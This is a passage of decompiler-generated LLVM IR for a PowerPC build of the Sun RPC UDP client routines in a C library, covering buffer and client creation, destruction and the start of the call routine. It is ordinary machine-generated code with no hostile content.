  %v0_10022494 = load i32, i32* @r8, align 4
  %v0_1002249c = load i32, i32* @r9, align 4
  store i32 %v0_1002249c, i32* @r29, align 4
  store i32 %arg1, i32* @r30, align 4
  %v1_100224a4 = add i32 %v0_10022494, 3
  store i32 12, i32* @r3, align 4
  store i32 %arg2, i32* @r23, align 4
  store i32 %arg3, i32* @r22, align 4
  %v0_100224b4 = load i32, i32* @r6, align 4
  %v1_100224b4 = inttoptr i32 %v0_100224b4 to i32*
  %v2_100224b4 = load i32, i32* %v1_100224b4, align 4
  store i32 %v2_100224b4, i32* %r25.global-to-local, align 4
  %v1_100224b8 = add i32 %v0_100224b4, 4
  %v2_100224b8 = inttoptr i32 %v1_100224b8 to i32*
  %v3_100224b8 = load i32, i32* %v2_100224b8, align 4
  store i32 %v3_100224b8, i32* @r26, align 4
  %v0_100224bc = load i32, i32* @r7, align 4
  store i32 %v0_100224bc, i32* %r24.global-to-local, align 4
  %v1_100224c0 = call i32 @__asm_rlwinm(i32 %v1_100224a4, i32 0, i32 0, i32 29)
  store i32 268575944, i32* @lr, align 4
  %v0_100224c4 = call i32 @malloc()
  store i32 %v0_100224c4, i32* %r3.global-to-local, align 4
  %v0_100224c8 = load i32, i32* @r29, align 4
  %v1_100224c8 = add i32 %v0_100224c8, 3
  store i32 %v0_100224c4, i32* @r27, align 4
  %v1_100224d0 = call i32 @__asm_rlwinm(i32 %v1_100224c8, i32 0, i32 0, i32 29)
  %v1_100224d4 = add i32 %v1_100224c0, 100
  %v2_100224d8 = add i32 %v1_100224d4, %v1_100224d0
  store i32 %v2_100224d8, i32* @r3, align 4
  store i32 268575968, i32* @lr, align 4
  %v0_100224dc = call i32 @malloc()
  store i32 %v0_100224dc, i32* %r3.global-to-local, align 4
  %v0_100224e0 = load i32, i32* @r27, align 4
  %v3_100224e0 = icmp eq i32 %v0_100224e0, 0
  store i32 %v0_100224dc, i32* @r31, align 4
  br i1 %v3_100224e0, label %dec_label_pc_100224f4, label %dec_label_pc_100224ec

dec_label_pc_100224ec:                            ; preds = %entry
  %v3_100224ec = icmp eq i32 %v0_100224dc, 0
  br i1 %v3_100224ec, label %dec_label_pc_100224f4, label %dec_label_pc_10022520

dec_label_pc_100224f4:                            ; preds = %dec_label_pc_100224ec, %entry
  store i32 268575992, i32* @lr, align 4
  %v0_100224f4 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_100224f4, i32* @r29, align 4
  %v3_10022500 = load i32, i32* @global_var_1004513c, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_1002fa24.1293 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10022510.1294 to i32), i32* @lr, align 4
  %v4_1002250c = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_1002fa24.1293 to i32), i32 %v3_10022500, i32 268697600)
  store i32 %v4_1002250c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_10022514 = load i32, i32* @r29, align 4
  %v2_10022514 = add i32 %v1_10022514, 8
  %v3_10022514 = inttoptr i32 %v2_10022514 to i32*
  store i32 12, i32* %v3_10022514, align 4
  %v0_10022518 = load i32, i32* %r0.global-to-local, align 4
  %v1_10022518 = load i32, i32* @r29, align 4
  %v2_10022518 = inttoptr i32 %v1_10022518 to i32*
  store i32 %v0_10022518, i32* %v2_10022518, align 4
  br label %dec_label_pc_100226a0

dec_label_pc_10022520:                            ; preds = %dec_label_pc_100224ec
  %v0_10022520 = load i32, i32* @r30, align 4
  %v1_10022520 = add i32 %v0_10022520, 2
  %v2_10022520 = inttoptr i32 %v1_10022520 to i16*
  %v3_10022520 = load i16, i16* %v2_10022520, align 2
  %v4_10022520 = zext i16 %v3_10022520 to i32
  store i32 %v4_10022520, i32* %r0.global-to-local, align 4
  %v1_10022524 = add i32 %v1_100224d0, 96
  %v2_10022528 = add i32 %v1_10022524, %v0_100224dc
  %v3_1002252c = icmp eq i16 %v3_10022520, 0
  %v2_10022530 = add i32 %v0_100224dc, 88
  %v3_10022530 = inttoptr i32 %v2_10022530 to i32*
  store i32 %v2_10022528, i32* %v3_10022530, align 4
  br i1 %v3_1002252c, label %dec_label_pc_10022538, label %dec_label_pc_10022558

dec_label_pc_10022538:                            ; preds = %dec_label_pc_10022520
  %v0_10022538 = load i32, i32* @r30, align 4
  store i32 %v0_10022538, i32* %r3.global-to-local, align 4
  %v0_1002253c = load i32, i32* @r23, align 4
  %v0_10022540 = load i32, i32* @r22, align 4
  store i32 268576076, i32* @lr, align 4
  %v5_10022548 = call i32 @pmap_getport(i32 %v0_10022538, i32 %v0_1002253c, i32 %v0_10022540, i32 17, i32 %v2_10022528)
  %v6_10022548 = trunc i32 %v5_10022548 to i16
  store i32 %v5_10022548, i32* %r3.global-to-local, align 4
  %v4_1002254c = icmp eq i16 %v6_10022548, 0
  br i1 %v4_1002254c, label %dec_label_pc_100226a0, label %dec_label_pc_10022554

dec_label_pc_10022554:                            ; preds = %dec_label_pc_10022538
  %v3_10022554 = load i32, i32* @r30, align 4
  %v4_10022554 = add i32 %v3_10022554, 2
  %v5_10022554 = inttoptr i32 %v4_10022554 to i16*
  store i16 %v6_10022548, i16* %v5_10022554, align 2
  br label %dec_label_pc_10022558

dec_label_pc_10022558:                            ; preds = %dec_label_pc_10022520, %dec_label_pc_10022554
  %v0_1002255c = load i32, i32* @r31, align 4
  %v1_1002255c = load i32, i32* @r27, align 4
  %v2_1002255c = add i32 %v1_1002255c, 8
  %v3_1002255c = inttoptr i32 %v2_1002255c to i32*
  store i32 %v0_1002255c, i32* %v3_1002255c, align 4
  store i32 -1, i32* %r11.global-to-local, align 4
  %v1_10022568 = load i32, i32* @r27, align 4
  %v2_10022568 = add i32 %v1_10022568, 4
  %v3_10022568 = inttoptr i32 %v2_10022568 to i32*
  store i32 ptrtoint (i32* @global_var_10045054.1295 to i32), i32* %v3_10022568, align 4
  %v0_1002256c = load i32, i32* @r31, align 4
  %v1_1002256c = add i32 %v0_1002256c, 8
  store i32 16, i32* %r0.global-to-local, align 4
  %v0_10022580 = load i32, i32* %r11.global-to-local, align 4
  %v2_10022580 = add i32 %v0_1002256c, 40
  %v3_10022580 = inttoptr i32 %v2_10022580 to i32*
  store i32 %v0_10022580, i32* %v3_10022580, align 4
  %v0_10022584 = load i32, i32* %r11.global-to-local, align 4
  %v1_10022584 = load i32, i32* @r31, align 4
  %v2_10022584 = add i32 %v1_10022584, 36
  %v3_10022584 = inttoptr i32 %v2_10022584 to i32*
  store i32 %v0_10022584, i32* %v3_10022584, align 4
  %v0_10022588 = load i32, i32* %r0.global-to-local, align 4
  %v1_10022588 = load i32, i32* @r31, align 4
  %v2_10022588 = add i32 %v1_10022588, 24
  %v3_10022588 = inttoptr i32 %v2_10022588 to i32*
  store i32 %v0_10022588, i32* %v3_10022588, align 4
  %v1_1002258c = load i32, i32* @r31, align 4
  %v2_1002258c = add i32 %v1_1002258c, 92
  %v3_1002258c = inttoptr i32 %v2_1002258c to i32*
  store i32 %v1_100224d0, i32* %v3_1002258c, align 4
  %v0_10022590 = load i32, i32* @r31, align 4
  %v0_10022594 = load i32, i32* %r25.global-to-local, align 4
  %v2_10022594 = add i32 %v0_10022590, 28
  %v3_10022594 = inttoptr i32 %v2_10022594 to i32*
  store i32 %v0_10022594, i32* %v3_10022594, align 4
  %v0_10022598 = load i32, i32* @r26, align 4
  %v1_10022598 = load i32, i32* @r31, align 4
  %v2_10022598 = add i32 %v1_10022598, 32
  %v3_10022598 = inttoptr i32 %v2_10022598 to i32*
  store i32 %v0_10022598, i32* %v3_10022598, align 4
  %v1_1002259c = load i32, i32* @r31, align 4
  %v2_1002259c = add i32 %v1_1002259c, 84
  %v3_1002259c = inttoptr i32 %v2_1002259c to i32*
  store i32 %v1_100224c0, i32* %v3_1002259c, align 4
  store i32 268576164, i32* @lr, align 4
  %v1_100225a0 = call i32 @_create_xid(i32 %v1_1002256c)
  store i32 %v1_100225a0, i32* %r3.global-to-local, align 4
  %v0_100225a4 = load i32, i32* @r31, align 4
  %v1_100225a4 = add i32 %v0_100225a4, 88
  %v2_100225a4 = inttoptr i32 %v1_100225a4 to i32*
  %v3_100225a4 = load i32, i32* %v2_100225a4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v1_100225a0, i32* %stack_var_-96, align 4
  %v0_100225b8 = load i32, i32* @r29, align 4
  store i32 %v0_100225b8, i32* %r3.global-to-local, align 4
  %v4_100225cc = inttoptr i32 %v0_100225b8 to i32*
  %v5_100225cc = call i32 @__GI_xdrmem_create(i32* %v4_100225cc, i32 %v3_100225a4, i32 %v1_100224c0, i32 0)
  %v0_100225d0 = load i32, i32* @r29, align 4
  store i32 %v0_100225d0, i32* %r3.global-to-local, align 4
  %v2_100225d4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268576220, i32* @lr, align 4
  %v2_100225d8 = inttoptr i32 %v0_100225d0 to i32*
  %v3_100225d8 = call i32 @__GI_xdr_callhdr(i32* %v2_100225d8, i32 %v2_100225d4)
  store i32 %v3_100225d8, i32* %r3.global-to-local, align 4
  %v3_100225dc = icmp eq i32 %v3_100225d8, 0
  br i1 %v3_100225dc, label %dec_label_pc_100226a0, label %dec_label_pc_100225e4

dec_label_pc_100225e4:                            ; preds = %dec_label_pc_10022558
  %v0_100225e4 = load i32, i32* @r31, align 4
  %v1_100225e4 = add i32 %v0_100225e4, 60
  %v2_100225e4 = inttoptr i32 %v1_100225e4 to i32*
  %v3_100225e4 = load i32, i32* %v2_100225e4, align 4
  %v0_100225e8 = load i32, i32* @r29, align 4
  store i32 %v0_100225e8, i32* %r3.global-to-local, align 4
  %v1_100225ec = add i32 %v3_100225e4, 16
  %v2_100225ec = inttoptr i32 %v1_100225ec to i32*
  %v3_100225ec = load i32, i32* %v2_100225ec, align 4
  call void @__pseudo_call(i32 %v3_100225ec)
  %v0_100225f8 = load i32, i32* %r24.global-to-local, align 4
  %v1_100225f8 = inttoptr i32 %v0_100225f8 to i32*
  %v2_100225f8 = load i32, i32* %v1_100225f8, align 4
  store i32 %v2_100225f8, i32* %r0.global-to-local, align 4
  %v0_100225fc = load i32, i32* %r3.global-to-local, align 4
  %v1_100225fc = load i32, i32* @r31, align 4
  %v2_100225fc = add i32 %v1_100225fc, 80
  %v3_100225fc = inttoptr i32 %v2_100225fc to i32*
  store i32 %v0_100225fc, i32* %v3_100225fc, align 4
  %v0_10022600 = load i32, i32* %r0.global-to-local, align 4
  %tmp10 = icmp sgt i32 %v0_10022600, -1
  br i1 %tmp10, label %dec_label_pc_10022688, label %dec_label_pc_10022608

dec_label_pc_10022608:                            ; preds = %dec_label_pc_100225e4
  store i32 1, i32* @r30, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268576288, i32* @lr, align 4
  %v3_1002261c = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_1002261c, i32* %r3.global-to-local, align 4
  %v1_10022624 = load i32, i32* %r24.global-to-local, align 4
  %v2_10022624 = inttoptr i32 %v1_10022624 to i32*
  store i32 %v3_1002261c, i32* %v2_10022624, align 4
  %tmp11 = icmp sgt i32 %v3_1002261c, -1
  br i1 %tmp11, label %dec_label_pc_1002264c, label %dec_label_pc_1002262c

dec_label_pc_1002262c:                            ; preds = %dec_label_pc_10022608
  store i32 ptrtoint (i32* @global_var_10022630.1296 to i32), i32* @lr, align 4
  %v0_1002262c = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_1002262c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v2_10022634 = inttoptr i32 %v0_1002262c to i32*
  store i32 12, i32* %v2_10022634, align 4
  %v0_1002263c = call i32 @__errno_location()
  store i32 %v0_1002263c, i32* %r3.global-to-local, align 4
  %v1_10022640 = inttoptr i32 %v0_1002263c to i32*
  %v2_10022640 = load i32, i32* %v1_10022640, align 4
  store i32 %v2_10022640, i32* %r0.global-to-local, align 4
  %v2_10022644 = add i32 %v0_1002262c, 8
  %v3_10022644 = inttoptr i32 %v2_10022644 to i32*
  store i32 %v2_10022640, i32* %v3_10022644, align 4
  br label %dec_label_pc_100226a0

dec_label_pc_1002264c:                            ; preds = %dec_label_pc_10022608
  store i32 268576340, i32* @lr, align 4
  %v3_10022650 = call i32 @__GI_bindresvport(i32 %v3_1002261c, i16* null)
  store i32 %v3_10022650, i32* %r3.global-to-local, align 4
  %v0_10022654 = load i32, i32* %r24.global-to-local, align 4
  %v1_10022654 = inttoptr i32 %v0_10022654 to i32*
  %v2_10022654 = load i32, i32* %v1_10022654, align 4
  store i32 %v2_10022654, i32* @r3, align 4
  %v2_1002265c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1002265c, i32* @r5, align 4
  store i32 -2147195266, i32* @r4, align 4
  store i32 268576364, i32* @lr, align 4
  %v0_10022668 = call i32 @ioctl()
  store i32 %v0_10022668, i32* %r3.global-to-local, align 4
  %v0_1002266c = load i32, i32* %r24.global-to-local, align 4
  %v1_1002266c = inttoptr i32 %v0_1002266c to i32*
  %v2_1002266c = load i32, i32* %v1_1002266c, align 4
  store i32 %v2_1002266c, i32* %r3.global-to-local, align 4
  %v2_10022678 = ptrtoint i32* %stack_var_-100 to i32
  %v0_10022680 = load i32, i32* @r30, align 4
  store i32 %v0_10022680, i32* %stack_var_-100, align 4
  store i32 268576392, i32* @lr, align 4
  %v5_10022684 = call i32 @__GI_setsockopt(i32 %v2_1002266c, i32 0, i32 11, i32 %v2_10022678, i32 4)
  store i32 %v5_10022684, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022688

dec_label_pc_10022688:                            ; preds = %dec_label_pc_100225e4, %dec_label_pc_1002264c
  %v0_10022688 = load i32, i32* @r30, align 4
  %v1_10022688 = load i32, i32* @r31, align 4
  %v2_10022688 = add i32 %v1_10022688, 4
  %v3_10022688 = inttoptr i32 %v2_10022688 to i32*
  store i32 %v0_10022688, i32* %v3_10022688, align 4
  %v0_1002268c = load i32, i32* %r24.global-to-local, align 4
  %v1_1002268c = inttoptr i32 %v0_1002268c to i32*
  %v2_1002268c = load i32, i32* %v1_1002268c, align 4
  store i32 %v2_1002268c, i32* %r0.global-to-local, align 4
  %v1_10022690 = load i32, i32* @r31, align 4
  %v2_10022690 = inttoptr i32 %v1_10022690 to i32*
  store i32 %v2_1002268c, i32* %v2_10022690, align 4
  store i32 268576408, i32* @lr, align 4
  %v0_10022694 = call i32 @authnone_create()
  store i32 %v0_10022694, i32* %r3.global-to-local, align 4
  %v1_10022698 = load i32, i32* @r27, align 4
  %v2_10022698 = inttoptr i32 %v1_10022698 to i32*
  store i32 %v0_10022694, i32* %v2_10022698, align 4
  br label %dec_label_pc_100226c4

dec_label_pc_100226a0:                            ; preds = %dec_label_pc_10022558, %dec_label_pc_10022538, %dec_label_pc_1002262c, %dec_label_pc_100224f4
  %v0_100226a0 = load i32, i32* @r31, align 4
  %v3_100226a0 = icmp eq i32 %v0_100226a0, 0
  br i1 %v3_100226a0, label %dec_label_pc_100226b0, label %dec_label_pc_100226a8

dec_label_pc_100226a8:                            ; preds = %dec_label_pc_100226a0
  store i32 %v0_100226a0, i32* @r3, align 4
  store i32 268576432, i32* @lr, align 4
  %v0_100226ac = call i32 @free()
  store i32 %v0_100226ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100226b0

dec_label_pc_100226b0:                            ; preds = %dec_label_pc_100226a0, %dec_label_pc_100226a8
  %v0_100226b0 = load i32, i32* @r27, align 4
  %v3_100226b0 = icmp eq i32 %v0_100226b0, 0
  br i1 %v3_100226b0, label %dec_label_pc_100226c4, label %dec_label_pc_100226b8

dec_label_pc_100226b8:                            ; preds = %dec_label_pc_100226b0
  store i32 %v0_100226b0, i32* @r3, align 4
  store i32 0, i32* @r27, align 4
  store i32 268576452, i32* @lr, align 4
  %v0_100226c0 = call i32 @free()
  store i32 %v0_100226c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100226c4

dec_label_pc_100226c4:                            ; preds = %dec_label_pc_100226b0, %dec_label_pc_10022688, %dec_label_pc_100226b8
  store i32 %v0_10022488, i32* %r0.global-to-local, align 4
  %v0_100226c8 = load i32, i32* @r27, align 4
  store i32 %v0_100226c8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100226c8

; uselistorder directives
  uselistorder i32 %v3_1002261c, { 2, 0, 1, 3 }
  uselistorder i32 %v5_10022548, { 1, 0 }
  uselistorder i32 %v0_100224dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_100224d0, { 1, 0, 2 }
  uselistorder i32 %v1_100224c0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 12, 13, 14, 15, 4, 16, 17, 18, 19, 20, 5, 6, 7, 21, 9, 8, 22, 23, 10, 24, 11, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 3, 2 }
  uselistorder i32 84, { 15, 4, 16, 11, 3, 2, 1, 0, 14, 6, 7, 8, 9, 10, 12, 13, 5 }
  uselistorder i32 100, { 22, 14, 12, 13, 1, 2, 3, 4, 5, 6, 15, 7, 16, 8, 17, 9, 18, 10, 19, 20, 21, 11, 0 }
  uselistorder label %dec_label_pc_100226c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100226b0, { 1, 0 }
  uselistorder label %dec_label_pc_100226a0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10022688, { 1, 0 }
  uselistorder label %dec_label_pc_10022558, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 8800, i32* @r8, align 4
  %v2_100226ec = load i32, i32* %arg1, align 4
  %v1_100226f0 = add i32 %tmp, 4
  %v2_100226f0 = inttoptr i32 %v1_100226f0 to i32*
  %v3_100226f0 = load i32, i32* %v2_100226f0, align 4
  store i32 %v3_100226f0, i32* @r10, align 4
  store i32 %v2_100226ec, i32* %stack_var_-8, align 4
  %v4_100226f8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v4_100226f8, i32* @r6, align 4
  store i32 8800, i32* @r9, align 4
  store i32 268576520, i32* @lr, align 4
  %v3_10022704 = call i32 @__GI_clntudp_bufcreate(i32 %v4_100226f8, i32 8800, i32 8800)
  ret i32 %v3_10022704

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v1_1002272c = add i32 %arg1, 8
  %v2_1002272c = inttoptr i32 %v1_1002272c to i32*
  %v3_1002272c = load i32, i32* %v2_1002272c, align 4
  store i32 %v3_1002272c, i32* @r31, align 4
  %v1_10022730 = add i32 %v3_1002272c, 4
  %v2_10022730 = inttoptr i32 %v1_10022730 to i32*
  %v3_10022730 = load i32, i32* %v2_10022730, align 4
  %v3_10022734 = icmp eq i32 %v3_10022730, 0
  br i1 %v3_10022734, label %dec_label_pc_10022744, label %dec_label_pc_1002273c

dec_label_pc_1002273c:                            ; preds = %entry
  %v1_1002273c = inttoptr i32 %v3_1002272c to i32*
  %v2_1002273c = load i32, i32* %v1_1002273c, align 4
  store i32 268576580, i32* @lr, align 4
  %v1_10022740 = call i32 @__libc_close(i32 %v2_1002273c)
  %v0_10022744.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10022744

dec_label_pc_10022744:                            ; preds = %entry, %dec_label_pc_1002273c
  %v0_10022744 = phi i32 [ %v3_1002272c, %entry ], [ %v0_10022744.pre, %dec_label_pc_1002273c ]
  %v1_10022744 = add i32 %v0_10022744, 60
  %v2_10022744 = inttoptr i32 %v1_10022744 to i32*
  %v3_10022744 = load i32, i32* %v2_10022744, align 4
  %v1_1002274c = add i32 %v3_10022744, 28
  %v2_1002274c = inttoptr i32 %v1_1002274c to i32*
  %v3_1002274c = load i32, i32* %v2_1002274c, align 4
  %v3_10022750 = icmp eq i32 %v3_1002274c, 0
  br i1 %v3_10022750, label %dec_label_pc_10022760, label %dec_label_pc_10022758

dec_label_pc_10022758:                            ; preds = %dec_label_pc_10022744
  call void @__pseudo_call(i32 %v3_1002274c)
  %v0_10022760.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10022760

dec_label_pc_10022760:                            ; preds = %dec_label_pc_10022744, %dec_label_pc_10022758
  %v0_10022760 = phi i32 [ %v0_10022744, %dec_label_pc_10022744 ], [ %v0_10022760.pre, %dec_label_pc_10022758 ]
  store i32 %v0_10022760, i32* @r3, align 4
  store i32 268576616, i32* @lr, align 4
  %v0_10022764 = call i32 @free()
  %v0_10022768 = load i32, i32* @r30, align 4
  store i32 %v0_10022768, i32* @r3, align 4
  store i32 268576624, i32* @lr, align 4
  %v0_1002276c = call i32 @free()
  ret i32 %v0_1002276c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10022760, { 1, 0 }
  uselistorder label %dec_label_pc_10022744, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i16 @__decompiler_undefined_function_2()
  %tmp43 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-8948 = alloca i32, align 4
  %stack_var_-9004 = alloca i32, align 4
  %stack_var_-9064 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-9020 = alloca i16, align 2
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-9044 = alloca i32, align 4
  %stack_var_-8900 = alloca i32, align 4
  %stack_var_-9060 = alloca i32, align 4
  %stack_var_-8936 = alloca i32, align 4
  %stack_var_-9072 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10022784 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10022784, i32* %stack_var_-9072, align 4
  store i32 %tmp, i32* %r23.global-to-local, align 4
  %v1_100227a4 = add i32 %arg7, 4
  %v2_100227a4 = inttoptr i32 %v1_100227a4 to i32*
  %v3_100227a4 = load i32, i32* %v2_100227a4, align 4
  store i32 %arg3, i32* %r20.global-to-local, align 4
  %v1_100227ac = add i32 %tmp, 8
  %v2_100227ac = inttoptr i32 %v1_100227ac to i32*
  %v3_100227ac = load i32, i32* %v2_100227ac, align 4
  store i32 %v3_100227ac, i32* @r30, align 4
  %v1_100227b4 = inttoptr i32 %arg7 to i32*
  %v2_100227b4 = load i32, i32* %v1_100227b4, align 4
  store i32 %v2_100227b4, i32* %r9.global-to-local, align 4
  %v1_100227bc = add i32 %v3_100227ac, 32
  %v2_100227bc = inttoptr i32 %v1_100227bc to i32*
  %v3_100227bc = load i32, i32* %v2_100227bc, align 4
  store i32 %v3_100227a4, i32* %r22.global-to-local, align 4
  %v1_100227c4 = add i32 %v3_100227ac, 40
  %v2_100227c4 = inttoptr i32 %v1_100227c4 to i32*
  %v3_100227c4 = load i32, i32* %v2_100227c4, align 4
  store i32 %v2_100227b4, i32* %r21.global-to-local, align 4
  %v2_100227cc = sdiv i32 %v3_100227bc, 1000
  %v1_100227d0 = add i32 %v3_100227ac, 28
  %v2_100227d0 = inttoptr i32 %v1_100227d0 to i32*
  %v3_100227d0 = load i32, i32* %v2_100227d0, align 4
  %v3_100227d4 = icmp eq i32 %v3_100227c4, -1
  %v1_100227dc = mul i32 %v3_100227d0, 1000
  %v2_100227e0 = add i32 %v1_100227dc, %v2_100227cc
  store i32 %v2_100227e0, i32* %r16.global-to-local, align 4
  br i1 %v3_100227d4, label %dec_label_pc_10022820, label %dec_label_pc_10022818

dec_label_pc_100227ec:                            ; preds = %dec_label_pc_100228ec
  %v0_100227ec = call i32 @__errno_location()
  store i32 %v0_100227ec, i32* %r3.global-to-local, align 4
  %v1_100227f4 = inttoptr i32 %v0_100227ec to i32*
  %v2_100227f4 = load i32, i32* %v1_100227f4, align 4
  store i32 %v2_100227f4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1002280c

dec_label_pc_10022804:                            ; preds = %dec_label_pc_10022a80, %dec_label_pc_10022c1c
  br label %dec_label_pc_1002280c

dec_label_pc_1002280c:                            ; preds = %dec_label_pc_100227ec, %dec_label_pc_10022804
  %storemerge = phi i32 [ 3, %dec_label_pc_100227ec ], [ 4, %dec_label_pc_10022804 ]
  %v0_1002280c = phi i32 [ 3, %dec_label_pc_100227ec ], [ 4, %dec_label_pc_10022804 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_1002280c = load i32, i32* @r30, align 4
  %v2_1002280c = add i32 %v1_1002280c, 44
  %v3_1002280c = inttoptr i32 %v2_1002280c to i32*
  store i32 %v0_1002280c, i32* %v3_1002280c, align 4
  %v0_10022810 = load i32, i32* %r9.global-to-local, align 4
  %v1_10022810 = load i32, i32* @r30, align 4
  %v2_10022810 = add i32 %v1_10022810, 48
  %v3_10022810 = inttoptr i32 %v2_10022810 to i32*
  store i32 %v0_10022810, i32* %v3_10022810, align 4
  br label %dec_label_pc_10022d20

dec_label_pc_10022818:                            ; preds = %entry
  %v1_10022818 = add i32 %v3_100227ac, 36
  %v2_10022818 = inttoptr i32 %v1_10022818 to i32*
  %v3_10022818 = load i32, i32* %v2_10022818, align 4
  store i32 %v3_10022818, i32* %r21.global-to-local, align 4
  store i32 %v3_100227c4, i32* %r22.global-to-local, align 4
  br label %dec_label_pc_10022820

dec_label_pc_10022820:                            ; preds = %entry, %dec_label_pc_10022818
  store i32 0, i32* %r19.global-to-local, align 4
  store i32 2, i32* %r17.global-to-local, align 4
  store i32 0, i32* %r24.global-to-local, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  %v2_10022924 = ptrtoint i32* %stack_var_-8936 to i32
  %v2_10022950 = ptrtoint i32* %stack_var_-9060 to i32
  %v4_10022a90 = zext i16 %tmp42 to i32
  %v1_10022a94 = and i32 %v4_10022a90, 8
  %v3_10022a94 = icmp eq i32 %v1_10022a94, 0
  %v2_10022be4 = ptrtoint i32* %stack_var_-9036 to i32
  %v2_10022bec = ptrtoint i32* %stack_var_-9064 to i32
  %v2_10022ab0 = ptrtoint i32* %stack_var_-8900 to i32
  %v2_10022ab8 = ptrtoint i16* %stack_var_-9020 to i32
  %v2_1002298c = ptrtoint i32* %stack_var_-9044 to i32
  %v2_100229f4 = ptrtoint i32* %stack_var_-8980 to i32
  %tmp82 = urem i16 %tmp43, 2
  %v1_100229d4 = zext i16 %tmp82 to i32
  %v3_100229d4 = icmp eq i16 %tmp82, 0
  %v2_10022c48 = ptrtoint i32* %stack_var_-9004 to i32
  %v2_10022c5c = ptrtoint i32* %stack_var_-8948 to i32
  br label %dec_label_pc_10022830

dec_label_pc_10022830:                            ; preds = %dec_label_pc_10022d0c, %dec_label_pc_10022820
  %v1_10022844 = phi i32 [ %v0_10022834.pre, %dec_label_pc_10022d0c ], [ %v3_100227ac, %dec_label_pc_10022820 ]
  %v0_10022830 = phi i32 [ %v0_10022830.pre, %dec_label_pc_10022d0c ], [ %arg3, %dec_label_pc_10022820 ]
  %v3_10022830 = icmp eq i32 %v0_10022830, 0
  %v1_10022834 = add i32 %v1_10022844, 56
  store i32 %v1_10022834, i32* @r26, align 4
  br i1 %v3_10022830, label %dec_label_pc_10022920, label %dec_label_pc_1002283c

dec_label_pc_1002283c:                            ; preds = %dec_label_pc_10022830
  %v1_10022840 = add i32 %v1_10022844, 60
  %v2_10022840 = inttoptr i32 %v1_10022840 to i32*
  %v3_10022840 = load i32, i32* %v2_10022840, align 4
  store i32 %v3_10022840, i32* %r9.global-to-local, align 4
  %v3_10022844 = inttoptr i32 %v1_10022834 to i32*
  store i32 0, i32* %v3_10022844, align 4
  %v0_10022848 = load i32, i32* @r26, align 4
  store i32 %v0_10022848, i32* %r3.global-to-local, align 4
  %v0_10022850 = load i32, i32* %r9.global-to-local, align 4
  %v1_10022850 = add i32 %v0_10022850, 20
  %v2_10022850 = inttoptr i32 %v1_10022850 to i32*
  %v3_10022850 = load i32, i32* %v2_10022850, align 4
  store i32 %v3_10022850, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022850)
  %v0_1002285c = load i32, i32* @r30, align 4
  %v1_1002285c = add i32 %v0_1002285c, 88
  %v2_1002285c = inttoptr i32 %v1_1002285c to i32*
  %v3_1002285c = load i32, i32* %v2_1002285c, align 4
  %v0_10022860 = load i32, i32* @r26, align 4
  store i32 %v0_10022860, i32* %r3.global-to-local, align 4
